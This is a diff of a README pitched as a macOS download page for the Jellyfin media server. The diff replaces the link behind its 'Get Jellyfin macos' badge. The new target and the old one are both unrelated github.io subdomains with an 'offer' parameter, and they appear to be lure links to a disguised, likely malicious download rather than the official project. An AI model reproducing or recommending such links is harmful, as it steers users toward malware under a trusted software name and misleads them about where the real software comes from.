@@ -3,7 +3,7 @@
 **Jellyfin** is a 100% free and open-source **media server** for **macOS**, enabling you to build your own private Netflix-style library.  
 Host, stream, and organize your personal movies, TV shows, music, and photos — all securely from your Mac, without cloud dependency or subscription fees. 🍎  
 
-[![💜 Get GitHub Instruction](https://img.shields.io/badge/💜%20Get%20Jellyfin%20macos-7E57C2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://app-dep-load.github.io/.github/?offer=JellyfinMac)
+[![💜 Get GitHub Instruction](https://img.shields.io/badge/💜%20Get%20Jellyfin%20macos-7E57C2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://hubset-desk.github.io/.github/?offer=JellyfinMac)
 
 ---
 
